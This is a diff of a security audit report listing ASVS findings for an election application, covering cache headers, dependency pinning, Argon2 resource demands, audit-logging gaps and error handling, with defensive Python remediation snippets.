+Add expiry tracking and rotation support to the Election class. Implement KEY_EXPIRY_DAYS configuration (e.g., 90 days) and check_key_expiry() method to validate key age. Implement rotate_keys_post_close() method to zero out key material after tallying is complete and results are finalized. Add key_created_at and key_expires_at columns to the election table schema to track key lifecycle. After election finalization, remove or re-encrypt key material. Implement automated cleanup of secrets past their useful life.
+
+---
+
+#### FINDING-056: No Cache-Control headers on pages serving sensitive election and voter data
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2, L3 |
+| CWE | - |
+| ASVS Sections | 14.2.2, 14.3.2, 14.2.5, 14.3.3 |
+| Files | v3/server/pages.py (ALL route handlers returning sensitive data) |
+| Source Reports | 14.2.2.md, 14.3.2.md, 14.2.5.md, 14.3.3.md |
+| Related Findings | - |
+
+**Description:**
+
+None of the route handlers set Cache-Control, Pragma, or Expires headers to prevent caching of sensitive pages. Pages containing voter eligibility status, election configuration, vote submission forms, and election documents could be cached by intermediate proxies, CDNs, load balancers, or browser caches. Affected endpoints include GET /voter (voter's elections, voting status), GET /vote-on/&lt;eid&gt; (election issues, candidate lists, voting form), GET /admin (owned elections list), GET /manage/&lt;eid&gt; (election metadata, issue list), GET /manage-stv/&lt;eid&gt;/&lt;iid&gt; (STV issue details), GET /docs/&lt;iid&gt;/&lt;docname&gt; (election documents), and POST /do-vote/&lt;eid&gt; redirect response (flash message confirming vote). Data flow: Server generates page with sensitive election data → Response sent without cache-control headers → Intermediate proxy/browser caches response → Cached sensitive data accessible to subsequent requests or shared computer users.
+
+**Remediation:**
+
+Add a middleware or decorator that sets anti-caching headers on all authenticated routes. Use @APP.after_request to add Cache-Control: no-store, no-cache, must-revalidate, max-age=0, Pragma: no-cache, and Expires: 0 headers to all non-static responses. Alternatively, create a no_cache decorator for specific sensitive endpoints that sets Cache-Control: no-store and Pragma: no-cache headers on responses.
+
+---
+
+#### FINDING-057: No documented risk-based remediation timeframes for third-party component vulnerabilities
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 15.1.1 |
+| Files | v3/steve/crypto.py, v3/steve/election.py, v3/server/main.py |
+| Source Reports | 15.1.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The provided codebase contains multiple third-party dependencies (cryptography, argon2-cffi, asfpy, easydict, Quart/asfquart, ezt) but no documentation defining risk-based remediation timeframes for addressing vulnerabilities or specifying update cadence for these libraries. No SECURITY.md, DEPENDENCY_POLICY.md, or equivalent documentation is present that defines: Critical vulnerability remediation timeframe (e.g., 24-48 hours), High vulnerability remediation timeframe (e.g., 7 days), Medium/Low vulnerability remediation timeframe (e.g., 30-90 days), or Routine update schedule for non-vulnerable components.
+
+**Remediation:**
+
+Create a docs/DEPENDENCY_POLICY.md with explicit timeframes defining remediation windows for Critical (48 hours), High (7 days), Medium (30 days), and Low (90 days) severity vulnerabilities. Include routine update schedules: Security-critical libraries (cryptography, argon2-cffi) monthly review, Framework libraries (Quart/asfquart) quarterly review, Utility libraries (easydict, asfpy) semi-annual review. Implement automated CVE monitoring via GitHub Dependabot/Safety/pip-audit and manual review of security advisories for cryptography library.
+
+---
+
+#### FINDING-058: No Software Bill of Materials (SBOM) or dependency manifest with pinned versions
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 15.1.2 |
+| Files | Project-wide, main.py, crypto.py, election.py |
+| Source Reports | 15.1.2.md |
+| Related Findings | - |
+
+**Description:**
+
+The provided codebase does not include a visible `requirements.txt`, `pyproject.toml` with pinned dependencies, `Pipfile.lock`, `uv.lock`, or any SBOM document (e.g., CycloneDX or SPDX format). While `main.py` uses a `uv run --script` shebang suggesting `uv` as the package manager, no lock file or dependency specification with version pins is provided. Identified dependencies from code analysis: `cryptography` (Fernet, HKDF, hashes) from `crypto.py`, `argon2-cffi` (low_level) from `crypto.py`, `asfpy` (db, generics) from `election.py` and `main.py`, `easydict` from `election.py`, `asfquart` (Quart wrapper) from `main.py`, and `ezt` (templating) from domain context. All versions are unknown. Without a versioned inventory: transitive dependencies are untracked (e.g., `cryptography` pulls in `cffi`, `pycparser`), reproducible builds are not guaranteed, vulnerability scanning tools cannot accurately assess the dependency tree, and there is no verification that dependencies come from trusted repositories.
+
+**Remediation:**
+
+1. Create a `pyproject.toml` with pinned dependencies including cryptography>=43.0.0, argon2-cffi>=23.1.0, asfpy>=0.45, easydict>=1.13, quart>=0.19.0, ezt>=1.2. 2. Generate and maintain a lock file using `uv lock`. 3. Generate SBOM in CycloneDX format using `cyclonedx-py environment -o sbom.json`. 4. Configure automated SBOM generation in CI/CD pipeline.
+
+---
+
+#### FINDING-059: Undocumented resource-intensive Argon2 operations with potential denial-of-service impact
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 15.1.3 |
+| Files | v3/steve/crypto.py (91-101), v3/steve/election.py (265-324) |
+| Source Reports | 15.1.3.md |
+| Related Findings | - |
+
+**Description:**
+
+The application contains several resource-demanding operations involving Argon2 key derivation that are not documented. Each Argon2 call allocates 64MB of memory. Critical operations include: (1) _hash() function with memory_cost=65536 KiB (64MB per call), (2) tally_issue() which iterates over ALL eligible voters calling gen_vote_token() (which calls _hash()) for each voter, (3) add_salts() which generates a salt for every person/issue combination in a single transaction, (4) open() which calls both add_salts() and gen_opened_key(), and (5) add_vote() which requires gen_vote_token() (Argon2) plus Fernet encryption per vote submission. For an election with 1000 voters and 10 issues, tally_issue() requires 1000 Argon2 calls with potential 64GB aggregate memory demand, add_salts() requires 10,000 salt generations, and concurrent vote submissions each require 64MB memory. There is no documentation of these resource demands, no documented rate limiting or queuing strategy, no consumer timeout guidance, and no documentation of maximum supported election size. Without documentation and mitigation, a large election's tally_issue() could exceed request timeouts, concurrent vote submissions during peak periods could exhaust server memory, and operators have no guidance for capacity planning.
+
+**Remediation:**
+
+Create docs/RESOURCE_ANALYSIS.md documenting: (1) Argon2 Key Derivation - Memory: 64MB per operation, CPU: ~50ms per operation (2 iterations, 4 threads), Locations: Vote submission, tally computation, election opening; (2) Tally Computation - Complexity: O(voters × issues) Argon2 operations, Mitigation: Performed offline via admin CLI (not web request), Timeout: Not applicable (CLI operation); (3) Vote Submission - Complexity: 1 Argon2 operation per vote, Mitigation: Single-instance deployment limits concurrency, Max concurrent: Limited by server memory (e.g., 16GB / 64MB = 250 concurrent); (4) Election Opening - Complexity: O(voters × issues) salt generations + 1 Argon2, Mitigation: Admin-only operation, performed once per election lifecycle; (5) Defenses - Tally is an admin CLI operation not exposed to web requests, Vote submission is authenticated (prevents anonymous DoS), Single-instance architecture limits parallelism naturally.
+
+---
+
+#### FINDING-060: Cannot verify component versions are within remediation timeframes due to missing version specifications
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 15.2.1 |
+| Files | v3/steve/crypto.py, Project-wide |
+| Source Reports | 15.2.1.md |
+| Related Findings | - |
+
+**Description:**
+
+Since no dependency manifest with pinned versions exists (as identified in ASVS-15.1.2), and no remediation policy exists (as identified in ASVS-15.1.1), it is impossible to verify that all components are within their documented update and remediation timeframes. Specific concerns: 1) cryptography library has frequent security advisories and without pinned version cannot verify currency; 2) Argon2 Type.D usage while OWASP recommends Type.ID for password hashing, with divergence between benchmark (Type.ID) and production (Type.D); 3) asfpy ASF-internal library with unknown release cadence and vulnerability tracking; 4) HKDF info parameter mismatch (info=b'xchacha20_key') is misleading for current Fernet usage, suggesting code may be in transitional state beyond intended timeframe.
+
+**Remediation:**
+
+1. Pin all dependency versions in pyproject.toml or equivalent. 2. Implement automated vulnerability scanning using pip-audit --require-hashes --desc or uv pip audit in CI/CD pipeline. 3. Create a dependency update log documenting Date, Component, From Version, To Version, and Reason for all updates.
+
+---
+
+#### FINDING-061: No logging inventory or documentation exists for the application stack
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.1.1 |
+| Files | v3/server/bin/tally.py (165), v3/server/pages.py (37), v3/steve/election.py (27) |
+| Source Reports | 16.1.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The application uses Python's standard `logging` module across three layers (web pages, election library, CLI tools) but no logging inventory document exists defining: What events are logged at each layer, the log format specification, where logs are stored (file, syslog, SIEM), how log access is controlled, log retention periods, and how logs are consumed for monitoring/alerting. The `logging.basicConfig(level=logging.INFO)` in `tally.py` sends to stderr by default. The web layer (`pages.py`) relies on whatever the application framework configures, which is undocumented. The `election.py` library logs to a logger with no explicit handler configuration.
+
+**Remediation:**
+
+Create a `LOGGING_INVENTORY.md` or equivalent documentation covering all layers, components, logger names, events logged, format, destination, retention, and access control. Document each layer (Web/pages.py, Library/election.py, CLI/tally.py) with structured information including JSON formatted logs, specific file destinations, 90-day to 1-year retention periods, and appropriate file permissions (root:adm 640).
+
+---
+
+#### FINDING-062: Election library logging omits WHO (actor) metadata from security events
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.1 |
+| Files | v3/steve/election.py (207), v3/steve/election.py (219), v3/steve/election.py (231), v3/steve/election.py (430) |
+| Source Reports | 16.2.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The `election.py` library logs creation, update, and state-change events without recording WHO performed the action. While `pages.py` adds user context at the handler level, the library-level logs are missing the actor (PID/UID). If the library is invoked through a different path (e.g., `tally.py`, future APIs, or direct imports), the WHO metadata is entirely absent. During incident investigation, it becomes impossible to correlate library-level events with the user who triggered them. This creates blind spots in the audit trail, especially for operations that bypass the web layer (CLI tools, scripts, direct database manipulation).
+
+**Remediation:**
+
+Option 1: Pass actor context to library methods:
+```python
+def add_issue(self, title, description, vtype, kv, actor_pid=None):
+    ...
+    _LOGGER.info(f'Actor[U:{actor_pid}] created issue[I:{iid}] in election[E:{self.eid}]')
+```
+
+Option 2: Use logging context (LoggerAdapter or contextvars):
+```python
+import contextvars
+_actor_ctx = contextvars.ContextVar('actor_pid', default='system')
+
+class Election:
+    def add_issue(self, title, description, vtype, kv):
+        ...
+        _LOGGER.info(f'Actor[U:{_actor_ctx.get()}] created issue[I:{iid}] in election[E:{self.eid}]')
+```
+
+---
+
+#### FINDING-063: Tally script performs security-critical operations without audit logging
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.1, 16.4.3 |
+| Files | v3/server/bin/tally.py (138-165) |
+| Source Reports | 16.2.1.md, 16.4.3.md |
+| Related Findings | - |
+
+**Description:**
+
+The tally script decrypts all votes for an election—one of the most sensitive operations in the system—without logging WHO (which administrator ran the tally), WHEN (timestamp of tally execution), WHERE (from which machine/terminal), or WHAT (which election was tallied, whether `--spy-on-open-elections` was used). The `--spy-on-open-elections` flag is especially concerning as it enables viewing votes before an election closes, and its use is not logged at all. An administrator could spy on open election results without any audit trail. Tamper detection events are output via `print()` rather than formal security logging, meaning they may not reach monitoring systems.
+
+**Remediation:**
+
+```python
+def main(spy_on_open, election_id, issue_id, db_fname, output_format):
+    import getpass
+    import socket
+    
+    operator = getpass.getuser()
+    hostname = socket.gethostname()
+    
+    _LOGGER.warning(
+        f'TALLY_INITIATED operator={operator} host={hostname} '
+        f'election_id={election_id} issue_id={issue_id} '
+        f'spy_on_open={spy_on_open} db_path={db_fname}'
+    )
+    
+    # ... existing logic ...
+    
+    if election.is_tampered(pdb):
+        _LOGGER.critical(
+            f'TAMPER_DETECTED operator={operator} election_id={election_id}'
+        )
+        sys.exit(1)
+    
+    _LOGGER.info(
+        f'TALLY_COMPLETED operator={operator} election_id={election_id} '
+        f'issues_tallied={len(issues)} voters_found={len(all_voters)}'
+    )
+```
+
+---
+
+#### FINDING-064: Debug print statements dump complete form data which may contain sensitive election configuration
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.5 |
+| Files | v3/server/pages.py (427), v3/server/pages.py (449) |
+| Source Reports | 16.2.5.md |
+| Related Findings | - |
+
+**Description:**
 
 Complete form data is dumped to stdout without any filtering or redaction. While current form fields are `title` and `description`, the EasyDict wrapper captures ALL submitted form fields. If future forms include sensitive data (candidate names for confidential elections, authorization groups, etc.), this would log them without protection. The `print()` call is a Type B gap—the `_LOGGER` system exists but is not used here, creating false confidence that logging is controlled. Any data submitted in these forms is broadcast to stdout without classification-based filtering. In containerized deployments, stdout is captured by orchestrators and may be accessible to operators without appropriate clearance.
 
 **Remediation:**
 
-Remove print statements entirely, or log only safe metadata:
-
-```python
-_LOGGER.debug(f'Issue form received: fields={list(form.keys())}')
-```
-
-Never log form values for election management operations.
+Remove print statements entirely, or log only safe metadata: `_LOGGER.debug(f'Issue form received: fields={list(form.keys())}')`. Never log form values for election management operations.
 
 ---
 
-#### FINDING-055: No Authentication Event Logging in Application Code
+#### FINDING-065: No Authentication Event Logging in Application Code
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.3.1 |
-| **Files** | v3/server/pages.py (entire file) |
-| **Source Reports** | 16.3.1.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.1 |
+| Files | v3/server/pages.py (entire file) |
+| Source Reports | 16.3.1.md |
+| Related Findings | - |
+
+**Description:**
 
 The application relies on `asfquart.auth.require` decorators for authentication enforcement, but no logging occurs at the authentication boundary within this application code. There is no evidence of authentication success or failure being logged. Authentication successes and failures are invisible to security monitoring. Brute force attempts, credential stuffing, or unauthorized access patterns cannot be detected through application logs.
 
 **Remediation:**
 
-Add authentication event logging middleware or hook using @APP.before_request to log all authentication attempts with metadata including uid, method=oauth, ip address, and path for both successful and failed authentication attempts.
-
----
-
-#### FINDING-056: Document Access Authorization Failure Not Logged
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.3.2 |
-| **Files** | v3/server/pages.py:596-602 |
-| **Source Reports** | 16.3.2.md |
-| **Related Findings** | None | **Description:**
-
-Authorization is checked for document access but failures are not logged. The serve_doc function checks mayvote authorization before serving election documents, but when the check fails, it returns a 404 without logging the unauthorized access attempt. Unauthorized attempts to access election documents (potentially sensitive nomination documents) are invisible to security monitoring.
-
-**Remediation:**
-
-Add logging when document authorization check fails before returning 404. Log the user ID, document name, issue ID, and IP address to create an audit trail of unauthorized document access attempts.
-
----
-
-#### FINDING-057: Missing Authorization Logging in State-Changing Operations
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.3.2 |
-| **Files** | v3/server/pages.py:449-470, v3/server/pages.py:472-489 |
-| **Source Reports** | 16.3.2.md |
-| **Related Findings** | None | **Description:**
-
-Multiple state-changing operations (do_open_endpoint, do_close_endpoint, do_set_open_at_endpoint, do_set_close_at_endpoint, do_add_issue_endpoint, do_edit_issue_endpoint, do_delete_issue_endpoint) have comments indicating authorization checks are not implemented. Any authenticated committer can open/close any election. Beyond missing authorization, there's no logging of whether the user performing the action is actually the election owner. These unauthorized modifications are logged as successful actions without flagging the lack of ownership.
-
-**Remediation:**
-
-Implement ownership-based authorization checks for all state-changing operations. Log both successful authorization (when user is owner) and failed authorization attempts (when user is not owner but attempts modification). Include user ID, election ID, action attempted, and IP address in logs.
-
----
-
-#### FINDING-058: Tampering Detection Does Not Use Logger
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.3.3, 16.3.4 |
-| **Files** | v3/server/bin/tally.py:153-156 |
-| **Source Reports** | 16.3.3.md, 16.3.4.md |
-| **Related Findings** | None | **Description:**
-
-The tamper detection check uses print() instead of the logging framework when tampering is detected—a critical security event. Tampering detected → print() to stdout → potentially lost if stdout is not captured → NO structured security log. Critical tampering events may not reach centralized logging systems. A print() to stdout may be lost if the process output is not captured, and it lacks structured metadata (timestamp format, severity, correlation IDs).
-
-**Remediation:**
-
-Replace print() with structured logging using _LOGGER.error with exc_info=True to capture full exception context. Example:
-
+Add authentication event logging middleware or hook:
 ```python
-_LOGGER.error('TALLY_ERROR: election=%s, issue=%s, error_type=%s, error=%s', election.eid, issue.iid, type(e).__name__, str(e), exc_info=True)
+# Add authentication event logging middleware or hook
+@APP.before_request
+async def log_authentication_event():
+    """Log all authentication attempts with metadata."""
+    s = await asfquart.session.read()
+    if s:
+        _LOGGER.info(
+            'AUTH_SUCCESS: uid=%s, method=oauth, ip=%s, path=%s',
+            sanitize_log(s['uid']),
+            quart.request.remote_addr,
+            quart.request.path,
+        )
+    elif quart.request.path not in PUBLIC_PATHS:
+        _LOGGER.warning(
+            'AUTH_FAILURE: ip=%s, path=%s, reason=no_session',
+            quart.request.remote_addr,
+            quart.request.path,
+        )
 ```
 
 ---
 
-#### FINDING-059: Input Validation Failures Not Logged
+#### FINDING-066: Tampering Detection Does Not Use Logger
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.3.3 |
-| **Files** | v3/server/pages.py:95-102, v3/server/pages.py:385, v3/server/pages.py:393 |
-| **Source Reports** | 16.3.3.md |
-| **Related Findings** | None | **Description:**
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.3, 16.3.4 |
+| Files | v3/server/bin/tally.py (153-156) |
+| Source Reports | 16.3.3.md, 16.3.4.md |
+| Related Findings | - |
 
-Input validation failures (potential bypass attempts) are not logged. Malformed input → validation failure → 400 response → NO LOG. Additional instances: do_vote_endpoint (line 385): Missing form data check with no logging; do_vote_endpoint (line 393): Invalid issue ID check with no logging. Injection attempts would be caught by validation but leave no audit trail.
+**Description:**
 
-**Remediation:**
-
-Add logging before validation failures:
-
-```python
-_LOGGER.warning('INPUT_VALIDATION_FAILURE: uid=%s, endpoint=%s, reason=%s, election=%s', result.uid, endpoint, reason, election.eid)
-```
-
-before aborting with 400.
-
----
-
-#### FINDING-060: User-Controlled Input in Log Messages Without Encoding
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | CWE-117 |
-| **ASVS Sections** | 16.4.1, 1.3.10 |
-| **Files** | v3/server/pages.py:440-443 |
-| **Source Reports** | 16.4.1.md, 1.3.10.md |
-| **Related Findings** | FINDING-187 | **Description:**
-
-Python f-strings are evaluated at the call site before being passed to the logging framework, so they are NOT vulnerable to traditional format string attacks (where attacker controls the format specifier). The form.title value is interpolated as a plain string value, not as a format directive. However, form.title could contain log injection characters (newlines, ANSI escape sequences) that could forge log entries or obscure audit trails. An attacker could inject newlines to create fake log entries.
+The tamper detection check uses print() instead of the logging framework when tampering is detected — a critical security event. Tampering detected → print() to stdout → potentially lost if stdout is not captured → NO structured security log. Critical tampering events may not reach centralized logging systems. A print() to stdout may be lost if the process output is not captured, and it lacks structured metadata (timestamp format, severity, correlation IDs).
 
 **Remediation:**
 
-Add a utility function to sanitize user-provided values before logging:
-
+Replace print() with structured logging using _LOGGER.critical() for tamper detection events:
 ```python
-import re
-
-def sanitize_for_log(value: str) -> str:
-    """Remove control characters that could enable log injection."""
-    return re.sub(r'[\x00-\x1f\x7f]', '', value)
-
-_LOGGER.info(
-    f'User[U:{result.uid}] created election[E:{election.eid}];'
-    f' title: "{sanitize_for_log(form.title)}"'
-)
+if election.is_tampered(pdb):
+    _LOGGER.critical(
+        'TAMPER_DETECTED: election_id=%s, db_path=%s',
+        election_id,
+        str(db_fname),
+    )
+    print(f'Error: Election {election_id} has been tampered with. Cannot proceed.')
+    sys.exit(1)
 ```
 
 ---
 
-#### FINDING-061: No log transmission to a logically separate system
+#### FINDING-067: Input Validation Failures Not Logged
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟠 High |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.3 |
+| Files | v3/server/pages.py (95-102), v3/server/pages.py (385), v3/server/pages.py (393) |
+| Source Reports | 16.3.3.md |
+| Related Findings | - |
+
+**Description:**
+
+Input validation failures (potential bypass attempts) are not logged. Malformed input → validation failure → 400 response → NO LOG. This affects multiple endpoints including _set_election_date (lines 95-102), do_vote_endpoint (line 385: missing form data check), and do_vote_endpoint (line 393: invalid issue ID check). Injection attempts would be caught by validation but leave no audit trail.
+
+**Remediation:**
+
+Add logging for all input validation failures:
+```python
+if not date_str:
+    _LOGGER.warning(
+        'INPUT_VALIDATION_FAILURE: uid=%s, endpoint=set_%s, reason=missing_date, election=%s',
+        result.uid, field, election.eid,
+    )
+    quart.abort(400, 'Missing date')
+
+try:
+    dt = datetime.datetime.fromisoformat(date_str).date()
+except ValueError:
+    _LOGGER.warning(
+        'INPUT_VALIDATION_FAILURE: uid=%s, endpoint=set_%s, reason=invalid_date_format, election=%s',
+        result.uid, field, election.eid,
+    )
+    quart.abort(400, 'Invalid date format')
+```
+
+#### FINDING-068: No log transmission to a logically separate system
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.4.3 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.4.3 |
 | **Files** | v3/server/pages.py:35, v3/steve/election.py:7, v3/server/bin/tally.py:34, v3/server/bin/tally.py:166 |
 | **Source Reports** | 16.4.3.md |
-| **Related Findings** | None | **Description:**
+| **Related** | - |
 
-The entire application uses Python's standard logging module with no configuration for transmitting logs to a logically separate system. The tally.py CLI configures logging.basicConfig(level=logging.INFO) which outputs to stderr only. The web application (pages.py) relies on Quart's default logging configuration, which similarly only writes locally. There is no evidence of syslog forwarding configuration (e.g., SysLogHandler), integration with centralized log management (ELK, Splunk, CloudWatch), log shipping agents or sidecars configured, remote logging handlers (SocketHandler, HTTPHandler), or any log output to files that could be shipped. If the application server is compromised, all security-relevant logs (authentication events, vote casting, election lifecycle changes, authorization failures) reside on the same system and can be modified or deleted by an attacker, destroying forensic evidence.
+**Description:**
+
+The entire application uses Python's standard logging module with no configuration for transmitting logs to a logically separate system. The tally.py CLI configures logging.basicConfig(level=logging.INFO) which outputs to stderr only. The web application (pages.py) relies on Quart's default logging configuration, which similarly only writes locally. There is no evidence of: Syslog forwarding configuration (e.g., SysLogHandler), Integration with centralized log management (ELK, Splunk, CloudWatch), Log shipping agents or sidecars configured, Remote logging handlers (SocketHandler, HTTPHandler), Any log output to files that could be shipped. If the application server is compromised, all security-relevant logs (authentication events, vote casting, election lifecycle changes, authorization failures) reside on the same system and can be modified or deleted by an attacker, destroying forensic evidence.
 
 **Remediation:**
 
-Configure remote log transmission using Python's logging handlers. Example: import logging.handlers and configure SysLogHandler to send logs to a remote syslog/log aggregator at address ('logserver.internal.example.org', 514) with facility LOG_AUTH. Set appropriate formatter with timestamp, name, level, and message. Integrate with centralized log management system (ELK, Splunk, CloudWatch) or configure log shipping agents/sidecars.
+Configure remote logging handlers to send logs to a logically separate system. Example implementation: import logging.handlers and configure SysLogHandler to send to remote syslog/log aggregator at address ('logserver.internal.example.org', 514) with facility LOG_AUTH. Set appropriate formatter with timestamp, name, levelname, and message fields.
 
 ---
 
-#### FINDING-062: No graceful degradation for database connectivity failures
+#### FINDING-069: No graceful degradation for database connectivity failures
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.5.2 |
-| **Files** | v3/server/pages.py (all route handlers), v3/steve/election.py:38 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.5.2 |
+| **Files** | v3/server/pages.py:all route handlers, v3/steve/election.py:38 |
 | **Source Reports** | 16.5.2.md |
-| **Related Findings** | None | **Description:**
+| **Related** | - |
 
-The load_election and load_election_issue decorators only catch ElectionNotFound exceptions. If the SQLite database file is locked, corrupted, or unavailable (disk full, permissions changed, etc.), an unhandled exception propagates to the framework's default error handler. There is no circuit breaker, retry logic, or graceful degradation pattern. This affects ALL routes that use load_election or load_election_issue. Database lock contention, disk failures, or resource exhaustion causes unhandled exceptions across all endpoints, potentially exposing error details and causing service unavailability without informative user messaging.
+**Description:**
+
+The load_election and load_election_issue decorators only catch ElectionNotFound exceptions. If the SQLite database file is locked, corrupted, or unavailable (disk full, permissions changed, etc.), an unhandled exception propagates to the framework's default error handler. There is no circuit breaker, retry logic, or graceful degradation pattern. This affects ALL routes that use load_election or load_election_issue: GET /vote-on/&lt;eid&gt;, GET /manage/&lt;eid&gt;, GET /manage-stv/&lt;eid&gt;/&lt;iid&gt;, POST /do-set-open_at/&lt;eid&gt;, POST /do-set-close_at/&lt;eid&gt;, POST /do-vote/&lt;eid&gt;, GET /do-open/&lt;eid&gt;, GET /do-close/&lt;eid&gt;, POST /do-add-issue/&lt;eid&gt;, POST /do-edit-issue/&lt;eid&gt;/&lt;iid&gt;, POST /do-delete-issue/&lt;eid&gt;/&lt;iid&gt;. Additionally affected without any decorator protection: GET /voter (directly calls Election.open_to_pid), GET /admin (directly calls Election.open_to_pid, Election.owned_elections). Database lock contention, disk failures, or resource exhaustion causes unhandled exceptions across all endpoints, potentially exposing error details and causing service unavailability without informative user messaging.
 
 **Remediation:**
 
-Wrap the Election initialization in the load_election decorator with try/except to catch sqlite3.OperationalError and OSError, logging the error and returning HTTP 503 Service Unavailable.
+Add exception handling for database connectivity failures in the load_election decorator:
+
+```python
+def load_election(func):
+    @functools.wraps(func)
+    async def loader(eid):
+        try:
+            e = steve.election.Election(DB_FNAME, eid)
+        except steve.election.ElectionNotFound:
+            result = await basic_info()
+            result.title = 'Unknown Election'
+            result.eid = eid
+            raise_404(T_BAD_EID, result)
+        except (sqlite3.OperationalError, OSError) as e:
+            _LOGGER.error(f'Database unavailable: {e}')
+            quart.abort(503)  # Service Unavailable
+        return await func(e)
+    return loader
+```
 
 ---
 
-#### FINDING-063: Implicit authorization failure via None dereference instead of explicit check in add_vote
+#### FINDING-070: Implicit authorization failure via None dereference instead of explicit check in add_vote
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.5.3 |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.5.3 |
 | **Files** | v3/steve/election.py:210-211 |
 | **Source Reports** | 16.5.3.md |
-| **Related Findings** | None | **Description:**
+| **Related** | - |
 
-When a person is not authorized to vote on a specific issue (no mayvote entry exists), the query returns None. The code immediately accesses mayvote.salt without checking for None. This results in an AttributeError rather than a proper authorization denial. While the vote IS blocked (fail-closed), the error response is a generic 500 rather than a proper 403 Forbidden, and the exception may expose details. This represents a fragile security boundary that depends on an accidental crash rather than intentional enforcement.
+**Description:**
+
+When a person is not authorized to vote on a specific issue (no mayvote entry exists), the query returns None. The code immediately accesses mayvote.salt without checking for None. This results in an AttributeError rather than a proper authorization denial. While the vote IS blocked (fail-closed), the error response is a generic 500 rather than a proper 403 Forbidden, and the exception may expose details. While this is technically fail-closed (the vote is not accepted), it represents a fragile security boundary that depends on an accidental crash rather than intentional enforcement. The 500 error also provides no useful feedback to the caller.
 
 **Remediation:**
-
-Add explicit None check:
 
 ```python
 mayvote = self.q_get_mayvote.first_row(pid, iid)
@@ -1304,291 +1652,93 @@ vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)
 
 ---
 
-#### FINDING-064: No global exception handler defined for the web application
+#### FINDING-071: No global exception handler defined for the web application
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 16.5.4 |
-| **Files** | v3/server/pages.py (entire file) |
+| **CWE** | - |
+| **ASVS Section(s)** | 16.5.4 |
+| **Files** | v3/server/pages.py:entire file |
 | **Source Reports** | 16.5.4.md |
-| **Related Findings** | None | **Description:**
+| **Related** | - |
 
-The application defines no "last resort" error handler. There is no @APP.errorhandler(Exception), @APP.errorhandler(500), or equivalent catch-all that would: 1. Log the full exception details for debugging 2. Return a generic error page to the user 3. Prevent the application process from crashing on unexpected exceptions. Only ElectionNotFound, IssueNotFound, and PersonNotFound are caught in specific locations. Any other exception type (e.g., sqlite3.OperationalError, TypeError, KeyError, json.JSONDecodeError) propagates to the framework default handler. Quart's default behavior in production mode returns a 500 page, but there's no guarantee DEBUG mode isn't enabled, error details are not guaranteed to be logged by a custom handler, no alerting or escalation is triggered, and no consistent error response format is provided.
+**Description:**
 
-**Remediation:**
-
-Implement global exception handlers: @APP.errorhandler(Exception) for catch-all, @APP.errorhandler(500) for internal errors, and @APP.errorhandler(503) for service unavailability. Each should log the error appropriately and return generic error pages.
-
----
-
-#### FINDING-065: Unconditional DEBUG logging level in all execution modes
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟠 High |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.4.2, 15.2.3 |
-| **Files** | v3/server/main.py:62-67, v3/server/main.py:101-106 |
